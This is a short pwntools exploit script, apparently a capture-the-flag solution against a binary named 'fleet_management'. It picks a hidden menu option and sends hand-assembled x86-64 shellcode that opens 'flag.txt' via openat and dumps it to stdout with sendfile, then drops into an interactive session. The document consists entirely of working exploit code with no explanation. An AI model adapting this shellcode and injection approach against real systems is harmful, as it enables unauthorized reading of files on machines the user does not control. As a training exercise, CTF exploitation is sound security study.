from pwn import *


# Allows you to switch between local/GDB/remote
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script
gdbscript = '''
break beta_feature
break skid_check
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './fleet_management'
# the context arch, bits, os and other
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging (info/debug)
context.log_level = 'debug'

#Exploit
io = start()
shellcode =  """xor rdx, rdx
                push rdx
                mov rsi, 0x7478742E67616C66
                push rsi
                mov rsi, rsp
                mov rax, 257
                mov rdi, -100
                syscall
                mov rsi, rax
                mov rax, 40
                mov rdi, 1
                mov r10, 100
                syscall
                """
assembled = asm(shellcode)
print(assembled)
io.sendlineafter(b'[*] What do you want to do? ', b'9')
io.sendline(assembled)
 
io.interactive()
